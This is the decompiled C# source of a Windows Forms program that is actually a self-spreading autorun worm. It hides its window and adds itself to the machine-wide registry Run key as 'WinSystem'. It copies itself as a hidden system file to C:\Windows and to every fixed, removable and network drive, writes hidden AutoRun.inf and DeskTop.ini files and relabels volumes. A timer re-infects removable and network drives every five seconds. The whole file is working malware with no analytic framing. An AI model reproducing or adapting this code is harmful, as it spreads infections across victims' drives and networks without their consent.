using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using HaTuTrinh.Properties;
using Microsoft.Win32;

namespace HaTuTrinh;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Timer timer1;

	private ToolStripMenuItem jljToolStripMenuItem;

	private ToolStripMenuItem ggjToolStripMenuItem;

	private int X;

	private int Y;

	private int Count = 0;

	private bool Showed = false;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		timer1 = new Timer(components);
		label1 = new Label();
		jljToolStripMenuItem = new ToolStripMenuItem();
		ggjToolStripMenuItem = new ToolStripMenuItem();
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.set_Interval(5000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(133, 235));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(0, 13));
		((Control)label1).set_TabIndex(4);
		((ToolStripItem)jljToolStripMenuItem).set_Name("jljToolStripMenuItem");
		jljToolStripMenuItem.set_ShowShortcutKeys(false);
		((ToolStripItem)jljToolStripMenuItem).set_Size(new Size(44, 28));
		((ToolStripItem)jljToolStripMenuItem).set_Text("j;lj");
		((ToolStripItem)ggjToolStripMenuItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)ggjToolStripMenuItem).set_ImageAlign((ContentAlignment)16);
		((ToolStripItem)ggjToolStripMenuItem).set_Name("ggjToolStripMenuItem");
		((ToolStripItem)ggjToolStripMenuItem).set_Padding(new Padding(0));
		((ToolStripItem)ggjToolStripMenuItem).set_Size(new Size(24, 24));
		((ToolStripItem)ggjToolStripMenuItem).set_Text("ggj");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Fuchsia);
		((Form)this).set_ClientSize(new Size(55, 42));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(Color.Fuchsia);
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public Form1()
	{
		InitializeComponent();
		((Control)this).set_Left(-500);
		((Control)this).set_Top(-500);
	}

	public static void Reg_StartUp()
	{
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			localMachine = localMachine.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
			localMachine.SetValue("WinSystem", "C:\\Windows\\WinSystem.exe");
			localMachine.Close();
		}
		catch
		{
		}
	}

	public static void NoneStartUp()
	{
		RegistryKey localMachine = Registry.LocalMachine;
		localMachine = localMachine.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
		try
		{
			localMachine.DeleteValue("WinSystem");
		}
		catch
		{
		}
		localMachine.Close();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (!Started())
		{
			Thread thread = new Thread(SelftCopy);
			thread.Start();
		}
		else
		{
			Application.Exit();
		}
	}

	private void Make_AutoRunFile(string DuongDan)
	{
		Application.DoEvents();
		try
		{
			Application.DoEvents();
			FileInfo fileInfo = null;
			StreamWriter streamWriter = null;
			if (File.Exists(DuongDan + "\\AutoRun.inf"))
			{
				File.Delete(DuongDan + "\\AutoRun.inf");
			}
			fileInfo = new FileInfo(DuongDan + "\\AutoRun.inf");
			Application.DoEvents();
			streamWriter = fileInfo.CreateText();
			Application.DoEvents();
			streamWriter.WriteLine("[autorun]");
			streamWriter.WriteLine("shellexecute=WinSystem.exe");
			streamWriter.WriteLine("icon=WinSystem.exe");
			Application.DoEvents();
			streamWriter.Close();
			File.SetAttributes(DuongDan + "\\AutoRun.inf", FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
	}

	private void Make_DesktopFile(string DuongDan)
	{
		Application.DoEvents();
		try
		{
			Application.DoEvents();
			FileInfo fileInfo = null;
			StreamWriter streamWriter = null;
			if (File.Exists(DuongDan + "\\DeskTop.ini"))
			{
				File.Delete(DuongDan + "\\DeskTop.ini");
			}
			fileInfo = new FileInfo(DuongDan + "\\DeskTop.ini");
			Application.DoEvents();
			streamWriter = fileInfo.CreateText();
			Application.DoEvents();
			streamWriter.WriteLine("[{BE098140-A513-11D0-A3A4-00C04FD706EC}]");
			streamWriter.WriteLine("iconarea_image=WinSystem.jpg");
			Application.DoEvents();
			streamWriter.Close();
			File.SetAttributes(DuongDan + "\\DeskTop.ini", FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
	}

	private void Make_DesktopImage(string DuongDan)
	{
		Application.DoEvents();
		try
		{
			Application.DoEvents();
			Image _ = (Image)(object)Resources._1;
			if (!File.Exists(DuongDan + "\\WinSystem.jpg"))
			{
				Application.DoEvents();
				_.Save(DuongDan + "\\WinSystem.jpg", ImageFormat.get_Jpeg());
				File.SetAttributes(DuongDan + "\\WinSystem.jpg", FileAttributes.Hidden | FileAttributes.System);
			}
		}
		catch
		{
		}
	}

	private void Make_AutoRunFileExe(string DuongDan)
	{
		Application.DoEvents();
		try
		{
			string text = "";
			text = ((DuongDan.Length != 3) ? (DuongDan + "\\WinSystem.exe") : (DuongDan + "WinSystem.exe"));
			if (!File.Exists(text))
			{
				Application.DoEvents();
				File.Copy(Application.get_ExecutablePath(), text);
				File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			}
		}
		catch
		{
		}
	}

	private void SelftCopy()
	{
		Application.DoEvents();
		Reg_StartUp();
		Application.DoEvents();
		Make_AutoRunFileExe("c:\\Windows");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			Application.DoEvents();
			if (driveInfo.Name.Substring(0, 1).ToLower().CompareTo("b") > 0)
			{
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
				{
					Make_AutoRunFile(driveInfo.Name);
					Application.DoEvents();
					Make_AutoRunFileExe(driveInfo.Name);
					Application.DoEvents();
					Make_DesktopFile(driveInfo.Name);
					Application.DoEvents();
					Make_DesktopImage(driveInfo.Name);
				}
				Application.DoEvents();
				try
				{
					driveInfo.VolumeLabel = "$(^_^)$";
				}
				catch
				{
				}
			}
		}
		timer1.set_Enabled(true);
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			Application.DoEvents();
			if (driveInfo.Name.Substring(0, 1).ToLower().CompareTo("b") > 0 && (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network))
			{
				Make_AutoRunFile(driveInfo.Name);
				Application.DoEvents();
				Make_AutoRunFileExe(driveInfo.Name);
				Application.DoEvents();
				Make_DesktopFile(driveInfo.Name);
				Application.DoEvents();
				Make_DesktopImage(driveInfo.Name);
				Application.DoEvents();
				try
				{
					driveInfo.VolumeLabel = "$(^_^)$";
				}
				catch
				{
				}
			}
			Application.DoEvents();
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private bool Started()
	{
		int num = 0;
		Process[] processes = Process.GetProcesses();
		int num2 = 0;
		while (true)
		{
			if (num2 < processes.Length)
			{
				Process process = processes[num2];
				Application.DoEvents();
				if (process.ProcessName.Trim().ToLower() == "winsystem")
				{
					num++;
					if (num == 2)
					{
						break;
					}
				}
				Application.DoEvents();
				num2++;
				continue;
			}
			return false;
		}
		return true;
	}
}
